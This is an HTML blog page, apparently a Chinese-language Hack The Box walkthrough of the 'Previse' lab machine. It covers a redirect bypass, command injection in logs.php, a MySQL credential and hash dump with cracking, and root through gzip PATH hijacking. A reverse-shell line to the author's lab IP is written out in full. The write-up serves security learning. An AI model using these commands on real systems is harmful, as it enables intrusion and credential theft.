@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ry0ma24.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content=".ugwheuwuboag{zoom:50%;}     OS Difficulty    Linux Easy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Previse">
+<meta property="og:url" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/index.html">
+<meta property="og:site_name" content="相忘于江湖">
+<meta property="og:description" content=".ugwheuwuboag{zoom:50%;}     OS Difficulty    Linux Easy">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/image-20250404152518515.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/image-20250404152429829.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/image-20250404152719306.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/image-20250404141506785.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/image-20250404142341145.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/image-20250404142515834.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/image-20250404142709658.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/image-20250404142630382.png">
+<meta property="og:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/image-20250404143853371.png">
+<meta property="article:published_time" content="2025-04-04T06:00:17.000Z">
+<meta property="article:modified_time" content="2025-04-11T08:00:54.472Z">
+<meta property="article:author" content="Ry0ma24">
+<meta property="article:tag" content="Bypass">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png">
+
+
+<link rel="canonical" href="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ry0ma24.github.io/Hackthebox/htb/htb-previse/","path":"Hackthebox/htb/htb-previse/","title":"HTB-Previse"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HTB-Previse | 相忘于江湖</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">相忘于江湖</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人生天地之间，若白驹之过隙，忽然而已</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-Scan"><span class="nav-number">1.</span> <span class="nav-text">Nmap Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ry0ma24"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ry0ma24</p>
+  <div class="site-description" itemprop="description">好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yourname@gmail.com" title="E-Mail → mailto:yourname@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ry0ma24.github.io/Hackthebox/htb/htb-previse/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ry0ma24">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="相忘于江湖">
+      <meta itemprop="description" content="好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HTB-Previse | 相忘于江湖">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB-Previse
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 14:00:17" itemprop="dateCreated datePublished" datetime="2025-04-04T14:00:17+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-04-11 16:00:54" itemprop="dateModified" datetime="2025-04-11T16:00:54+08:00">2025-04-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Hackthebox/" itemprop="url" rel="index"><span itemprop="name">Hackthebox</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><style>.ugwheuwuboag{zoom:50%;}</style><img src="/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png" class="ugwheuwuboag">
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.104 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> 
+Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-04-04 <span class="token number">14</span>:00 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.104
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT   STATE SERVICE VERSION
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">53</span>:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">33</span>:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.29 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+<span class="token operator">|</span> http-cookie-flags: 
+<span class="token operator">|</span>   /: 
+<span class="token operator">|</span>     PHPSESSID: 
+<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
+<span class="token operator">|</span> http-title: Previse Login
+<span class="token operator">|</span>_Requested resource was login.php
+<span class="token operator">|</span>_http-server-header: Apache/2.4.29 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">81.53</span> seconds</code></pre>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问80端口找到一个登录页面</p>
+<img src="/Hackthebox/htb/htb-previse/image-20250404152518515.png" class="" title="登录页面">
+
+<p>使用burp 抓包查看站点目录，找到一个accounts.php</p>
+<img src="/Hackthebox/htb/htb-previse/image-20250404152429829.png" class="" title="burp">
+
+<p>访问这个accounts.php，发现跳转不过去，可以尝试修改响应包 <code>Location：login.php</code> ，之后跳转到 accounts.php </p>
+<img src="/Hackthebox/htb/htb-previse/image-20250404152719306.png" class="" title="burp">
+
+<img src="/Hackthebox/htb/htb-previse/image-20250404141506785.png" class="" title="add new account">
+
+<p>添加一个新账号，然后登录可以找到站点备份的压缩包</p>
+<img src="/Hackthebox/htb/htb-previse/image-20250404142341145.png" class="" title="登录">
+
+<p>下载并解压在config.php中可以找到mysql的用户名和密码</p>
+<img src="/Hackthebox/htb/htb-previse/image-20250404142515834.png" class="" title="压缩包">
+
+<img src="/Hackthebox/htb/htb-previse/image-20250404142709658.png" class="" title="数据库配置">
+
+<p>分析其他php文件，在logs.php 中exec方法中引用了POST全局变量</p>
+<img src="/Hackthebox/htb/htb-previse/image-20250404142630382.png" class="" title="logs.php">
+
+<p>根据格式直接构造反弹shell，最好使用url 编码</p>
+<img src="/Hackthebox/htb/htb-previse/image-20250404143853371.png" class="" title="反弹shell">
+
+<p>成功反弹shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9001</span>                                     
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9001</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.104<span class="token punctuation">]</span> <span class="token number">35844</span>
+bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
+bash: no job control <span class="token keyword">in</span> this shell
+www-data@previse:/var/www/html$ <span class="token function">id</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先生成交互式shell，方便操作mysql，可以在数据库中查询到两条密码hash</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">www-data@previse:&#x2F;var&#x2F;www&#x2F;html$ script &#x2F;dev&#x2F;null -c &#x2F;bin&#x2F;bash
+script &#x2F;dev&#x2F;null -c &#x2F;bin&#x2F;bash
+Script started, file is &#x2F;dev&#x2F;null
+www-data@previse:&#x2F;var&#x2F;www&#x2F;html$ mysql -u root -p 
+mysql -u root -p 
+Enter password: mySQL_p@ssw0rd!:)
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 14
+Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2021, Oracle and&#x2F;or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and&#x2F;or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+
+mysql&gt; show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| previse            |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql&gt; use previse;
+use previse;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables; 
+show tables;
++-------------------+
+| Tables_in_previse |
++-------------------+
+| accounts          |
+| files             |
++-------------------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from accounts;
+select * from accounts;
++----+----------+------------------------------------+---------------------+
+| id | username | password                           | created_at          |
++----+----------+------------------------------------+---------------------+
+|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+|  2 | admin    | $1$🧂llol$uXqzPW6SXUONt.AIOBqLy. | 2025-04-04 05:56:26 |
++----+----------+------------------------------------+---------------------+
+2 rows in set (0.00 sec)</code></pre>
+
+<p>使用John 破解hash </p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ john <span class="token number">1</span>.hash <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt <span class="token parameter variable">--format</span><span class="token operator">=</span>md5crypt-long
+Using default input encoding: UTF-8
+Loaded <span class="token number">2</span> password hashes with no different salts <span class="token punctuation">(</span>md5crypt-long, crypt<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token variable">$1</span>$ <span class="token punctuation">(</span>and variants<span class="token punctuation">)</span> <span class="token punctuation">[</span>MD5 <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
+Will run <span class="token number">8</span> OpenMP threads
+Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
+admin            <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
+ilovecody112235<span class="token operator">!</span> <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
+2g <span class="token number">0</span>:00:03:00 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-04-04 <span class="token number">14</span>:57<span class="token punctuation">)</span> <span class="token number">0</span>.01108g/s 41100p/s 41100c/s 41210C/s ilovecokey<span class="token punctuation">..</span>ilovecody<span class="token punctuation">..</span>
+Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+
+<p>使用数据库中的用户名和密码登录ssh</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> m4lwhere@10.10.11.104
+The authenticity of <span class="token function">host</span> <span class="token string">'10.10.11.104 (10.10.11.104)'</span> can't be established.
+ED25519 key fingerprint is SHA256:BF5tg2bhcRrrCuaeVQXikjd8BCPxgLsnnwHlaBo3dPs.
+This key is not known by any other names.
+Are you sure you want to <span class="token builtin class-name">continue</span> connecting <span class="token punctuation">(</span>yes/no/<span class="token punctuation">[</span>fingerprint<span class="token punctuation">]</span><span class="token punctuation">)</span>? <span class="token function">yes</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+Last login: Fri Jun <span class="token number">18</span> 01:09:10 <span class="token number">2021</span> from <span class="token number">10.10</span>.10.5
+m4lwhere@previse:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m4lwhere<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m4lwhere<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m4lwhere<span class="token punctuation">)</span>
+m4lwhere@previse:~$ <span class="token function">ls</span>
+user.txt</code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 查看是否有可以利用的配置，找到一个备份功能的脚本，查看脚本功能很简单就是使用gzip把日志文件归档。</p>
+<p>gzip 并不是绝对路径，那可以使用path劫持来提权，进入&#x2F;tmp 创建一个shell脚本，命名为gzip，内容为</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&amp;></span>/dev/tcp/10.10.16.39/9003 <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;1</span> </code></pre>
+
+<p>然后将&#x2F;tmp 添加到环境变量，最后给脚本添加执行权限，运行脚本</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">m4lwhere@previse:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> m4lwhere: 
+User m4lwhere may run the following commands on previse:
+    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /opt/scripts/access_backup.sh
+
+m4lwhere@previse:~$ <span class="token function">cat</span> /opt/scripts/access_backup.sh
+<span class="token comment">#!/bin/bash</span>
+
+<span class="token comment"># We always make sure to store logs, we take security SERIOUSLY here</span>
+
+<span class="token comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+<span class="token comment"># This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time</span>
+
+<span class="token function">gzip</span> <span class="token parameter variable">-c</span> /var/log/apache2/access.log <span class="token operator">></span> /var/backups/<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token parameter variable">--date</span><span class="token operator">=</span><span class="token string">"yesterday"</span> +%Y%b%d<span class="token variable">)</span></span>_access.gz
+<span class="token function">gzip</span> <span class="token parameter variable">-c</span> /var/www/file_access.log <span class="token operator">></span> /var/backups/<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token parameter variable">--date</span><span class="token operator">=</span><span class="token string">"yesterday"</span> +%Y%b%d<span class="token variable">)</span></span>_file_access.gz
+
+m4lwhere@previse:/tmp$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+m4lwhere@previse:/tmp$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span><span class="token builtin class-name">:</span><span class="token environment constant">$PATH</span>
+m4lwhere@previse:/tmp$ <span class="token function">nano</span> <span class="token function">gzip</span> 
+m4lwhere@previse:/tmp<span class="token comment"># cat gzip</span>
+<span class="token comment">#!/bin/bash</span>
+<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&amp;></span>/dev/tcp/10.10.16.39/9003 <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;1</span> 
+
+m4lwhere@previse:/tmp$ <span class="token function">chmod</span> +x <span class="token function">gzip</span> 
+m4lwhere@previse:/tmp$ <span class="token function">sudo</span> /opt/scripts/access_backup.sh </code></pre>
+
+<p>成功反弹shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9003</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9003</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.104<span class="token punctuation">]</span> <span class="token number">40558</span>
+root@previse:/tmp<span class="token comment"># id      </span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Flag1</td>
+<td>&#x2F;home&#x2F;m4lwhere&#x2F;user.txt</td>
+</tr>
+<tr>
+<td>Flag2</td>
+<td>&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Bypass/" rel="tag"># Bypass</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Hackthebox/htb/htb-busqueda/" rel="prev" title="HTB-Busqueda">
+                  <i class="fa fa-angle-left"></i> HTB-Busqueda
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Hackthebox/htb/hackthebox/" rel="next" title="HackTheBox-网络优化">
+                  HackTheBox-网络优化 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ry0ma24</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
